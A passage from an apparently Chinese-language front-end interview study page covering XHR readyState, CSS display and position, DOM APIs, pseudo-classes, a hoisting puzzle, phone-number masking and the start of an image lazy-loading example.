operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> xhr<span class="token punctuation">.</span>readyState<span class="token operator">==</span><span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span> xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//readyState</span><span class="token comment" spellcheck="true">//0：初始化，XMLHttpRequest对象还没有完成初始化</span><span class="token comment" spellcheck="true">//1：载入，XMLHttpRequest对象开始发送请求</span><span class="token comment" spellcheck="true">//2：载入完成，XMLHttpRequest对象的请求发送完成</span><span class="token comment" spellcheck="true">//3：解析，XMLHttpRequest对象开始读取服务器的响应</span><span class="token comment" spellcheck="true">//4：完成，XMLHttpRequest对象读取服务器响应结束</span></code></pre><h2 id="display有哪些属性"><a href="#display有哪些属性" class="headerlink" title="display有哪些属性"></a>display有哪些属性</h2><ul><li><strong>display: none;表示此元素将不被显示。</strong></li><li><strong>display: block;将元素显示为块元素。（又叫块级元素）</strong></li><li><strong>display: inline;将元素显示为内联元素。（又叫行内元素）</strong></li></ul><blockquote><p>内联元素不可以设置高度、宽度<br>只能设置左右的margin值和左右的padding值，而不能设置上下的margin值和上下的padding值<br>常见：span、img、input、a、label、button</p></blockquote><ul><li><strong>display: inline-block;将元素显示为内联块元素。</strong></li></ul><blockquote><p>不换行，但可以设置宽高</p></blockquote><ul><li><strong>display: inherit;规定应该从父元素继承 display 属性的值。</strong></li></ul><h2 id="position有哪些属性"><a href="#position有哪些属性" class="headerlink" title="position有哪些属性"></a>position有哪些属性</h2><ul><li>position:static，出现在文档流中，不受top，left影响</li><li>position:relative，相对定位，根据元素原来位置定位，在文档流中</li><li>position:absolute，绝对定位，根据relative的父元素定位，脱离文档流</li><li>positoin:fixed，相对于浏览器窗口固定位置，脱离文档流。</li><li>position:inherit,继承</li><li>position:initial</li><li>position:sticky，</li></ul><blockquote><p> position: sticky; 基于用户的滚动位置来定位。</p></blockquote><p>粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。</p><p>在目标区域以内，它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token class">.top</span>,    <span class="token class">.middle</span>,    <span class="token class">.bottom</span> </span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span> lightblue<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.middle</span> </span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.bottom</span> </span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.fixed</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>middle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fixed<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bottom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--fixed在bottom的左上角，脱离文档流后被覆盖了--></span></code></pre><h2 id="transform有哪些属性"><a href="#transform有哪些属性" class="headerlink" title="transform有哪些属性"></a>transform有哪些属性</h2><p><code>transform: rotate | scale | skew | translate |matrix;</code></p><ul><li><p>transform:rotate(30deg)</p></li><li><p>scale(x,y)使元素水平方向和垂直方向同时缩放（也就是X轴和Y轴同时缩放）；</p><p>scaleX(x)元素仅水平方向缩放（X轴缩放）；</p><p>scaleY(y)元素仅垂直方向缩放（Y轴缩放）</p></li><li><p>skew(x,y)使元素在水平和垂直方向同时扭曲（X轴和Y轴同时按一定的角度值进行扭曲变形）；</p><p>skewX(x)仅使元素在水平方向扭曲变形（X轴扭曲变形）；</p><p>skewY(y)仅使元素在垂直方向扭曲变形（Y轴扭曲变形），</p></li><li><p>translate:同样有三种方法</p></li><li><p>matrix</p></li></ul><h2 id="input标签的属性"><a href="#input标签的属性" class="headerlink" title="input标签的属性"></a>input标签的属性</h2><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- maxlength 属性规定输入字段的最大长度--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- autocomplete 属性规定输入字段是否应该启用自动完成功能。自动完成允许浏览器预测对字段的输入。当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项。 开启为默认--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>on/off<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><h2 id="如何给一个页面添加10000个div"><a href="#如何给一个页面添加10000个div" class="headerlink" title="如何给一个页面添加10000个div"></a>如何给一个页面添加10000个div</h2><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zh-cn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector">body div </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">2</span>px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#ee3333</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token comment" spellcheck="true">// 利用 innerHTML 拼接字符串的方式     (添加10000个div)  (耗时约900ms） 最慢</span>    <span class="token comment" spellcheck="true">// function f() {</span>    <span class="token comment" spellcheck="true">//     var date = +new Date();</span>    <span class="token comment" spellcheck="true">//     for (var i = 1; i &lt;= 10000; i++) {</span>    <span class="token comment" spellcheck="true">//         document.body.innerHTML += "&lt;div>&lt;/div>"</span>    <span class="token comment" spellcheck="true">//     }</span>    <span class="token comment" spellcheck="true">//     var date1 = +new Date();</span>    <span class="token comment" spellcheck="true">//     console.log(date1-date);</span>    <span class="token comment" spellcheck="true">// }</span>    <span class="token comment" spellcheck="true">// f();</span>    <span class="token comment" spellcheck="true">// 利用 innerHTML 数组赋值的方式  结构稍微复杂  （添加10000个div)   （耗时约15ms)  最快</span>    <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            str<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'&lt;div>&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>        <span class="token keyword">var</span> date1 <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>date1 <span class="token operator">-</span> date<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 利用 createElement    结构清晰简单          (添加10000个div)   (耗时约20ms) 比最快慢一丢丢</span>    <span class="token comment" spellcheck="true">// function f() {</span>    <span class="token comment" spellcheck="true">//     var date = +new Date();</span>    <span class="token comment" spellcheck="true">//     for (var i = 1; i &lt;= 10000; i++) {</span>    <span class="token comment" spellcheck="true">//         var div = document.createElement('div');</span>    <span class="token comment" spellcheck="true">//         document.body.appendChild(div);</span>    <span class="token comment" spellcheck="true">//     }</span>    <span class="token comment" spellcheck="true">//     var date1 = +new Date();</span>    <span class="token comment" spellcheck="true">//     console.log(date1 - date);</span>    <span class="token comment" spellcheck="true">// }</span>    <span class="token comment" spellcheck="true">// f();</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="原生js操作DOM的API"><a href="#原生js操作DOM的API" class="headerlink" title="原生js操作DOM的API"></a>原生js操作DOM的API</h2><h4 id="创建型API总结"><a href="#创建型API总结" class="headerlink" title="创建型API总结"></a>创建型API总结</h4><blockquote><p>创建型API包括createElement,createTextNode,cloneNode和createDocumentFragment四个方法，需要注意下面几点:<br> (1) 它们创建的节点，只是一个孤立的节点，需要通过appendChild添加到文档中。<br> (2) cloneNode要注意，如果被复制，是否包含子节点以及事件绑定等问题。<br> (3) 使用createDocumentFragment来解决添加大量节点时的性能问题  。</p></blockquote><hr><h4 id="页面修改型API总结"><a href="#页面修改型API总结" class="headerlink" title="页面修改型API总结"></a>页面修改型API总结</h4><blockquote><p>修改页面内容的API主要包括：appendChild,removeChild,insertBefore,replaceChild<br> 需要注意几点：<br> (1) 不管是新增还是替换节点，如果新增或者替换的节点原本是存在于页面上的，则其原来位置的节点将被移除，也就是说同一个节点，不能存在于页面上的多个位置。<br> (2) 节点本身绑定的事件不会消失，会一直保留。</p></blockquote><hr><h4 id="节点查询型API总结"><a href="#节点查询型API总结" class="headerlink" title="节点查询型API总结"></a>节点查询型API总结</h4><blockquote><p> document.getElementById<br> document.getElementByName<br> document.getElementByTagName<br> document.getElementByClassName<br> document.querySelector和document.querySelectorAll：通过CSS选择器来查找元素，注意选择器要复合CSS选择器的规则。使用深度优先搜索来获取元素。</p></blockquote><hr><h4 id="节点关系型API总结"><a href="#节点关系型API总结" class="headerlink" title="节点关系型API总结"></a>节点关系型API总结</h4><p>父关系型API</p><ul><li>parentNode: Element的父节点可能是Element,Document和DocumentFragment</li><li>parentElement:与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null。</li></ul><p>兄弟关系型API</p><ul><li>previousSibling: 节点的前一个节点，如果该节点是第一个节点，则为null.注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下。</li><li>previousElementSibling:返回前一个元素节点，前一个节点必须是Element,注意IE9以下浏览器不支持。</li><li>nextSibling: 节点的后一个节点，如果该节点是最后一个节点，则为null. 注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下。</li><li>nextElementSibling: 返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持。</li></ul><p>子关系型API</p><ul><li>childNodes :返回一个即时的nodeList,表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。</li><li>children: 一个即时的HTMLCollection,子节点都是Element，IE9以下浏览器不支持。</li><li>firstNode: 第一个子节点</li><li>lastNode: 最后一个子节点</li><li>hasChildNodes方法：可以用来判断是否包含子节点</li></ul><hr><h4 id="元素属性型API"><a href="#元素属性型API" class="headerlink" title="元素属性型API"></a>元素属性型API</h4><blockquote><p> setAttribute: 根据名称和值修改元素的特性，eg:element.setAttribute(name,value);<br> getAttribute: 返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。</p></blockquote><h4 id="元素样式型API"><a href="#元素样式型API" class="headerlink" title="元素样式型API"></a>元素样式型API</h4><p>window.getComutedStyle是用来获取应用到元素后的样式，假设某个元素并未设置高度，而是通过其内容将其高度撑开，这时候要获取它的高度，就要用到getComutedStyle，用法如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> style <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">getComputedStyle</span><span class="token punctuation">(</span>element<span class="token punctuation">[</span><span class="token punctuation">,</span> pseudoElt<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p> element是要获取的元素，pseudoElt指定一个伪元素进行匹配。<br> 返回的style是一个CSSStyleDeclaration对象。<br> 通过style可以访问到元素计算后的样式<br> clientRect是一个DOMRect对象，包含left，top，right，bottom，它是相对于可视窗口的距离，滚动位置发生改变时，它们的值是会发生变化的。除了IE9以下浏览器，还包含元素的height和width等数据；</p></blockquote><h2 id="伪类和伪元素"><a href="#伪类和伪元素" class="headerlink" title="伪类和伪元素"></a>伪类和伪元素</h2><p>伪类：<code>:focus</code>,<code>:hover</code>以及<code>&lt;a&gt;</code>标签的<code>:link</code>、<code>visited</code>等，</p><p>伪元素：较常见的比如<code>:before</code>、<code>:after</code>等。 </p><p><strong>（1）伪类的功能</strong></p><p>1.获取不存在与DOM树中的信息 。比如： <code>&lt;a&gt;</code> 标签的<code>:link、:visited</code> 等。这些信息不存在于DOM树中。</p><p>2.获取 不能被常规CSS选择器获取到的信息。比如：要获取第一个子元素，我们无法用常规的CSS选择器获取，但可以通过 <code>:first-child</code> 来获取到。</p><blockquote><p> <strong>伪类其实是弥补了CSS选择器的不足，用来更方便地获取信息。</strong> </p></blockquote><p> <strong>（2）伪元素的功能</strong></p><blockquote><p><strong>而伪元素本质上是创建了一个虚拟容器(元素)，我们可以在其中添加内容或样式。</strong> </p></blockquote><p><strong>（3）冒号区别</strong></p><blockquote><p>伪元素的由<strong>两个冒号</strong><code>::</code>开头，然后是伪元素的名称。</p></blockquote><blockquote><p>使用两个冒号<code>::</code>是为了区别伪类和伪元素（CSS2中并没有区别）。当然，考虑到兼容性，CSS2中已存的伪元素仍然可以使用一个冒号<code>:</code>的语法，但是CSS3中新增的伪元素必须使用两个冒号<code>::</code></p></blockquote><pre class=" language-js"><code class="language-js">div<span class="token punctuation">:</span>afterdiv<span class="token punctuation">:</span><span class="token punctuation">:</span>afterdiv<span class="token punctuation">:</span>first<span class="token operator">-</span>childdiv<span class="token punctuation">:</span><span class="token punctuation">:</span>first<span class="token operator">-</span>child <span class="token comment" spellcheck="true">//错</span></code></pre><h3 id="结构性伪类元素"><a href="#结构性伪类元素" class="headerlink" title="结构性伪类元素"></a>结构性伪类元素</h3><p>结构性伪类选择器的公共特征是允许开发者根据文档结构来指定元素的样式。 </p><p><strong>（1）nth-child和nth-last-child</strong> </p><pre class=" language-js"><code class="language-js">       p<span class="token punctuation">:</span>nth<span class="token operator">-</span><span class="token function">child</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span>background<span class="token punctuation">:</span>red<span class="token punctuation">}</span>  表示E父元素中的第n个字节点      p<span class="token punctuation">:</span>nth<span class="token operator">-</span><span class="token function">child</span><span class="token punctuation">(</span>odd<span class="token punctuation">)</span><span class="token punctuation">{</span>background<span class="token punctuation">:</span>red<span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*匹配奇数行*/</span>      p<span class="token punctuation">:</span>nth<span class="token operator">-</span><span class="token function">child</span><span class="token punctuation">(</span>even<span class="token punctuation">)</span><span class="token punctuation">{</span>background<span class="token punctuation">:</span>red<span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*匹配偶数行*/</span>      p<span class="token punctuation">:</span>nth<span class="token operator">-</span><span class="token function">child</span><span class="token punctuation">(</span>2n<span class="token punctuation">)</span><span class="token punctuation">{</span>background<span class="token punctuation">:</span>red<span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*其中n是从0开始计算*/</span></code></pre><p><strong>（2）E:first-child和E:last-child</strong> </p><p><strong>（3）nth-of-type(n) 和E:nth-last-of-type(n)</strong> </p><p><strong>（4）</strong>）E:root（根节点）、E:only-child（独子元素）、E:only-of-type（独子类型元素）和E:empty（孤节点） </p><h2 id="变量提升的一道题"><a href="#变量提升的一道题" class="headerlink" title="变量提升的一道题"></a>变量提升的一道题</h2><pre class=" language-js"><code class="language-js">       <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">'哈哈'</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//3,f</span><span class="token comment" spellcheck="true">//4,哈哈</span><span class="token comment" spellcheck="true">//2，哈哈</span><span class="token comment" spellcheck="true">//1，哈哈</span></code></pre><h2 id="正则将手机号中间四位变为"><a href="#正则将手机号中间四位变为" class="headerlink" title="正则将手机号中间四位变为*"></a>正则将手机号中间四位变为*</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">replacePhone</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> reg <span class="token operator">=</span> <span class="token regex">/^(\d{3})(\d{4})(\d{4})$/</span>       <span class="token keyword">return</span>  str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span><span class="token string">'$1****$3'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h2><p>一张图片就是一个<img>标签，而图片的来源主要是src属性。浏览器是否发起亲求就是根据是否有src属性决定的。</p><p>既然这样，那么我们就要对<img>标签的src属性下手了，在没进入可视区域的时候，我们先不给这个<img>标签赋src属性，这样岂不是浏览器就不会发送请求了。</p><pre class=" language-js"><code class="language-js">document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token comment" spellcheck="true">//获取屏幕可视区域的高度</span>element<span class="token punctuation">.</span>offsetTop<span class="token comment" spellcheck="true">//获取元素相对于文档顶部的高度</span>document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>scrollTop<span class="token comment" spellcheck="true">//获取浏览器窗口顶部与文档顶部之间的距离，也就是滚动条滚动的距离</span></code></pre><p><img src="https://pic1.zhimg.com/80/v2-af1ab0c5f34e468e8647135c1f9f51e4_720w.jpg" alt="1"></p><p>如果：offsetTop-scroolTop&lt;clientHeight，则图片进入了可视区内，则被请求。 </p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>图片懒加载<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector">img </span><span class="token punctuation">{</span>            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/1.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/2.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/3.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/4.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/6.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/7.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span 